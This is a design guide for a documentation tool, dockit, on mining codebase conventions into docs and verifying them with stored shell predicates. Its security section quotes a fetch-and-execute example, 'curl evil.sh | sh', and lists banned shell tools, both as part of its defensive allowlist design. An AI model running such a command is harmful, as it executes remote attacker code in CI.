# Choice Mining

How dockit decides what to write into PRINCIPLES.md and into foundation entries — and what it must leave to a human.

> Companion to [WRITING-GUIDE.md § Earn the Heading](./WRITING-GUIDE.md#earn-the-heading). Earn the Heading says what to **cut**. This guide says what to **add**.

---

## The three bands

Every statement you could write about a codebase falls into one of three kinds. They are not equally worth writing.

| Band | What it is | Generate? |
|------|-----------|-----------|
| **Overview** | What the code does. `SearchClient` wraps the vendor SDK, handles auth, parses responses. | **No** — the agent gets this by reading the file. Only permitted compressed to a one-line pointer. |
| **Choice** | What the team settled on. "Use `SearchClient` for all vendor search." | **Yes** — this is the whole job. |
| **Rationale** | Why, and what was rejected. "Raw SDK calls leaked retry logic and broke during a vendor migration." | **Never** — not recoverable from code. Leave the slot open. |

### The overview ban is conditional — check before applying it

The evidence against generated overview was measured on repos that **already had documentation**. There, a generated summary duplicates what the agent could read for itself and costs tokens for nothing. On a repo with no docs, the same study found generated context *helped* — there was nothing else to read.

So check first, and pick a posture:

| Repo state | Detection | Posture |
|---|---|---|
| **Documented** | A `docs/` directory exists, or `README.md` is more than ~50 lines of real content | Strict. Overview only as one-line pointers. Everything in this guide applies as written. |
| **Doc-barren** | No `docs/`, and `README.md` is missing, a stub, or generated boilerplate | Relaxed. Write the fuller purpose and architecture prose an orientation needs. |

In the relaxed posture, say so in the run report: *"No existing docs found — generated fuller overview prose. Re-run sync once you've curated it and I'll tighten to pointers."* The next sync on a now-documented repo applies the strict rule and reports what it would cut.

**Two things do not relax, ever.** Rationale is still never invented — a barren repo is exactly where a plausible-sounding reason is most likely to survive unchallenged. And mined choices still enter at the Convention tier with predicates; a repo having no docs says nothing about whether a pattern was intentional.

Choice is the target because it's the only band that is simultaneously *novel* to the agent, *action-changing right now*, and *cheap to state*. Overview fails novelty. Rationale fails immediacy — it matters only when someone reopens the decision.

The economic argument: a choice is **derivable at a cost**. The import graph does contain "use the wrapper," but no agent walks the import graph before writing its first line — under task pressure it skips discovery and builds bespoke. Mining pays that discovery cost once and converts it into a line every future session reads for free.

### Same fact, three ways

> **Overview** — don't write it
> "`search/client.py` provides an abstraction over the vendor search SDK, handling authentication, request construction, and response parsing."

> **Choice** — write this
> "Use `SearchClient` (`search/client.py`) for all vendor-search operations."

> **Rationale** — leave it open for a human
> `[TODO: why?]`

---

## The two tiers

Mined statements are not all equally binding, and rendering them in one voice is how a coincidence gets promoted to law without anyone deciding it.

| Tier | Means | Who writes it |
|------|-------|---------------|
| **Convention** | How it's done here. Follow by default; deviating is fine with a stated reason. | dockit, freely |
| **Rule** | Deviating is a defect. | Humans only |

**dockit writes only Convention.** Promotion to Rule is always a human act. A wrong Convention costs a bit of misplaced consistency; a wrong Rule blocks correct work and breeds workarounds. That asymmetry is why the line is drawn here rather than behind a confirmation gate — a gate that blocks generation until someone drains a queue is a gate nobody uses twice.

The tiers do nothing unless the file declares them. Every generated PRINCIPLES.md and FOUNDATIONS.md opens with the legend verbatim:

```markdown
> **Convention** — how it's done here. Follow by default; deviating is fine if you say why.
> **Rule** — deviating is a defect. Don't.
```

Without those two lines an agent reads the whole file as undifferentiated instruction and the tier is decoration.

> **This block is the canonical wording.** It's reproduced in `PRINCIPLES.template.md`, `FOUNDATIONS.template.md`, and every generated doc — templates need the literal text because consuming projects don't ship this guide. When changing it, change it here first and propagate; two files disagreeing about what "Convention" permits is worse than either wording alone.
>
> One copy is *deliberately* different: `agentkit`'s `foundation-agent.template.md` expands the same two definitions into behavioural instructions for an agent ("do not block them"). That's an elaboration, not a competing definition — don't collapse it back to match.

---

## What you may write without asking

Trust tracks one thing: **is this a measurement, or a judgment about intent?**

| Write it | Why |
|---|---|
| Any rule whose predicate passes right now | Not a judgment. The command returns 0 direct SDK imports, so the statement is verifiably true today. |
| `Extend by:` backed by a scaffold command that exists and a git history showing it used | Mechanical. |
| Canonical example selection | Worst case you picked the second-best example. |
| Catalog rows, paths, consumers, counts | Already automatic. |

| Write it, but flag it in the report | Why |
|---|---|
| Conventions at 80–99% with no clean predicate | Someone has to judge whether the exceptions matter. |
| Prohibitions | Highest blocking cost, and the weakest compliance. Convention tier only, predicate required, never above. |
| `Doesn't cover:` | Absence carries no marker distinguishing boundary from gap. |

| Never | Why |
|---|---|
| Promotion to Rule | Human act by definition. |
| Rationale | Invented, not found. A fluent guess is worse than a blank. |
| Legacy-vs-current calls (family 6) | Inverting it is confidently harmful. Parked. |

---

## The two filters

Run both before writing any line. Most candidate lines die here, and that's the point.

### 1. Name the alternative

**A rule must name the plausible alternative the team did not take.** If you can't name one, it isn't a decision — it's the path of least resistance, and the line is cut.

| Candidate | Alternative? | Verdict |
|---|---|---|
| "Tests live in `tests/`" | None — that's where pytest looks | ✂️ Cut. Ecosystem default. |
| "Use `SearchClient`, not the SDK directly" | Direct SDK calls | ✅ Write. |
| "Handlers return `Result[T]`" | Raising exceptions | ✅ Write. |
| "Type hints on all functions" | None — the type checker requires it | ✂️ Cut. See filter 2. |

This substitutes a test you can actually run for "does it deviate from ecosystem defaults," which has no mechanical implementation. It uses your own priors — the same priors that make a fact obvious or surprising to the agent reading it downstream. It also gives you half the rationale block for free, since the rejected alternative is one of its two fields.

### 2. Is a machine already enforcing it?

If a linter, formatter, type checker, or CI gate enforces the rule, **cut the line**. The tool guarantees compliance; restating it in prose changes nothing and costs tokens on every read.

Check before writing: `ruff.toml`, `.eslintrc*`, `biome.json`, `mypy.ini`, `tsconfig.json`, `.pre-commit-config.yaml`, CI workflow files.

---

## Size budget

Filters cut individual lines. They don't stop a file growing back over a year of syncs, and a rule nobody reads is a rule nobody follows. Practitioner consensus puts a context file under ~300 lines with a ceiling around 150–200 instructions; those are working numbers, not measured research, so treat them as a prompt to review rather than a hard stop.

| File | Soft budget |
|---|---|
| `PRINCIPLES.md` | ~200 lines · ~40 rules across both tiers |
| One `FOUNDATIONS.md` entry | ~8 invariants |

**Over budget is a report, not a refusal.** Never silently drop a rule to fit. Instead, rank the existing rules weakest-first and surface the bottom few for review:

1. Lowest conformance (an 81% Convention before a 100% one)
2. Longest-unanswered `[TODO: why?]` — a rule nobody has justified in six months is a rule nobody missed
3. No predicate, so nothing has ever verified it
4. Newest, if the rest tie — an established rule has earned more benefit of the doubt

Report as: *"PRINCIPLES.md is at 247 lines / 51 rules, past the ~200 / ~40 budget. Weakest 5 by evidence: … — review?"* Route it to the review queue like any other decision.

If a project deliberately runs over, that's fine — it's their file. Say it once per sync and move on; don't nag every run.

---

## The six families

Classified by evidence source, because evidence determines both confidence and failure mode.

### 1. Boundary choices
A wrapper exists and the import graph favours it over the thing it wraps.

- **Detect:** find modules that import a third-party SDK, then count importers of the SDK elsewhere.
- **Write:** "Use `A` for X operations."
- **Predicate:** `check` — count direct imports outside the wrapper, expect 0.
- **Fails when:** the wrapper is vestigial and the team abandoned it. The exception list catches this.

### 2. Structural conventions
A repeated shape: naming, return types, layering, registration.

- **Detect:** find the set of like things, count how many share the shape.
- **Threshold:** ≥80% conforming, exceptions named. Below that, say nothing.
- **Predicate:** `conform`.
- **Fails when:** coincidence read as rule. The tier is the mitigation.

### 3. Extension-point choices
The sanctioned way to add a new X. **The most valuable family** — natively task-shaped, and what an agent most needs at the build-vs-reuse moment.

- **Detect, in order of strength:**
  1. Git history — take the last 3–5 additions of this kind of thing and intersect the files each one touched. The intersection *is* the procedure.
  2. Scaffold commands in `Makefile`, `package.json` scripts, `pyproject.toml`.
  3. Registry files — a module whose body is a list of registered things.
- **Write:** "New handler → `make scaffold-handler`, then register in `registry.py`."

### 4. Config-encoded choices
Selections visible in config or dependencies that nothing enforces.

- **Detect:** config file + actual usage in source.
- **Excluded by filter 2** whenever a tool enforces it — which covers most of them.

### 5. Canonical-example selection
Which instance is the exemplar. Feeds foundation entries and agentkit hot memory.

- **Detect:** most-conforming instance × most-referenced.
- **Write:** copy the real call site verbatim with a `path:line` comment. Never a synthesised example, and never a signature list — signatures are derivable and go stale on every rename.

### 6. Directional choices — **parked, do not mine**
Old and new patterns coexist; new code favours the new one. Requires history mining and can invert the truth — the "new" pattern may be the abandoned experiment. Not implemented.

---

## Stored predicates

Every mined rule carries the command that verifies it, in a comment beside the rule. The rendered line stays a bare instruction.

**Two forms**, matching the two evidence shapes:

```markdown
**Use `SearchClient` for all vendor-search operations.**
<!-- dockit:check cmd="rg -l 'import vendor_sdk' --glob '!search/client.py' | wc -l" expect="0" last="2026-08-01" -->

**API handlers return `Result[T]`.** Exceptions: `legacy_export.py`, `health.py`.
<!-- dockit:conform cmd="rg -c '-> Result\[' api/handlers/*.py | wc -l" total="rg -l '' api/handlers/*.py | wc -l" min="80%" last="2026-08-01" -->
```

- `check` — `cmd` prints a violation count. Passes at `expect`.
- `conform` — `cmd` prints conforming count, `total` prints the population. Passes at `min`.

**Why stored and not re-derived.** Re-running a fixed command returns the same answer every sync. Re-deriving the count from a fresh analysis depends on the next pass scoping its scan identically — and when it doesn't, it reports drift that isn't there. The stored predicate is what keeps this check deterministic instead of a judgment call.

**Why hidden.** Conformance counts printed on the page tax every agent that reads the doc *to follow* the rule, for information that only matters *to verify* it. The exception list stays visible — an agent needs to know where the rule doesn't apply, or it will "fix" the exceptions.

A **generated** prohibition without a predicate is not admissible. Context alone is the weak enforcement path; the predicate is what backs it up. Human-authored Rules are exempt — a team may assert something no command can check ("admin UX changes are validated with a content editor"), and refusing to record it would be worse than leaving it unverified.

### Predicates are executed code — treat them as such

A predicate is a shell command living in a checked-in markdown file that `sync` runs. That makes a docs change an execution path: a pull request adding an invariant with `cmd="curl evil.sh | sh"` runs the next time anyone syncs, and repokit is meant to run in CI. Two guards, both required.

**1. Grammar allowlist — enforced on every predicate, generated or hand-written.**

A predicate is admissible only if it satisfies all of:

**Evaluate the grammar on shell structure, not raw substrings.** Split the command into pipeline stages with a quote-aware parse first, then apply the checks below to *unquoted* regions only. Naive substring matching rejects valid predicates: `rg '-> Result\['` contains `>`, and `rg 'execute\(text\('` contains `exec`, but both are search patterns inside quotes and neither is a shell operator. Anything inside single or double quotes is data.

| Requirement | |
|---|---|
| Every command in the pipeline is one of | `rg` `grep` `ls` `find` `wc` `sort` `uniq` `head` `tail` `cut` `tr` |
| `git` is allowed with these subcommands only | `log` `ls-files` `grep` `show` `diff` — never `checkout`, `push`, `config`, `clean` |
| No unquoted | `;` `&&` `\|\|` `$(` `` ` `` `>` `>>` `<` `&` newline |
| Not invoked at all | `xargs`, `sh`, `bash`, `env`, `eval`, `exec`, `find -exec`, or any interpreter |
| Quotes balance | An unbalanced quote means the parse is unreliable — reject rather than guess |

Pipes (`|`) between stages are permitted — that's how counts get built — but every stage must independently pass. `xargs` is excluded specifically because it launches a command the grammar can't see; rewrite as a single `rg` invocation instead.

**A predicate that fails the grammar is never run, and there is no override.** Flag it and leave the rule unverified. That's deliberate: an override prompt puts the decision in front of the same person who'd approve the malicious PR. If a rule genuinely needs a richer check than the grammar allows, it doesn't get an automatic predicate — record it and verify it by hand.

**2. Approve on first sight.**

Approved predicates are recorded in `.dockit/predicates.lock`, one line per entry:

```
<sha256-of-cmd-string>  docs/PRINCIPLES.md  Import from app/core/ rather than the underlying library
```

On every sync:

| State | Action |
|---|---|
| Hash present in the lock file | Run it |
| Hash absent or changed | Show the exact command and what it's attached to; run only if the user approves, then record the hash |
| Fails the grammar | Refuse, flag, never record — regardless of the lock file |

Grammar first, always. A hash in the lock file does not license a command the grammar rejects; that ordering is what stops an attacker from shipping a poisoned lock entry alongside a poisoned predicate.

Commit `.dockit/predicates.lock` — reviewing a change to it is reviewing which commands the repo will execute, which is exactly the diff a reviewer should see.

---

## Rationale blocks

Rationale is never mined. When a human supplies one, it goes in a collapsed block directly under its rule:

```markdown
**Query through the SQLAlchemy ORM.** Raw SQL only in `migrations/`.

<details><summary>Why</summary>

Raw SQL bypassed the tenant filter twice and leaked rows across workspaces.
Rejected: a query linter — it can't see string interpolation.
</details>
```

Two fields: the reason, and the rejected alternative. Collapsing is for human readability, not token savings — an agent reads it either way. The point of attaching it to the rule is that a rule and its recorded reason can't drift apart the way a rule and a separate decision file do.

Until a human fills it, write `[TODO: why?]` and nothing else.

---

## On sync: re-verify, never auto-remove

Re-run every predicate. When one fails, **flag it — do not delete the rule.**

A decayed conformance count means one of two things, and nothing in the evidence tells you which:

- The rule is wrong, and the code moved on.
- The rule is right, and the code is drifting away from it.

Deleting on failure quietly removes correct rules at exactly the moment a codebase is going bad. Route the flag to the review queue instead:

```
Rule decayed: "API handlers return Result[T]"
  Was 11/13 (2026-08-01) → now 6/13
  New non-conformers: bulk_import.py, webhooks.py, sync_status.py
  → doc wrong, or code drifting?
```

Same for a dead path in an example or a scaffold command that no longer exists.

---

## What goes to the review queue

Mining produces human-required work. Surface it in the completion report; `/repokit status` picks it up from there.

| Item | The question |
|---|---|
| Convention written at 80–99% | Real pattern, or should the exceptions be fixed? |
| Empty `[TODO: why?]` | One sentence of reason. |
| `Doesn't cover:` observation | Intentional boundary, or a gap? |
| Sustained 100% conformance | Promote to Rule? |
| Failed predicate | Doc wrong, or code drifting? |
| SDD-artifact discrepancy | Which side is right? |

---

## Best-practice observations stay out of the docs

You will notice things worth saying — no tests on a foundation, retry logic duplicated across three consumers, no scaffold path for a common addition. **Report them in chat. Never write them into the docs.**

A generic recommendation sitting in a project's own documentation is indistinguishable, to the next agent, from a decision the team actually made. It starts getting built toward. The docs record what is true about this codebase; advice stays advice.
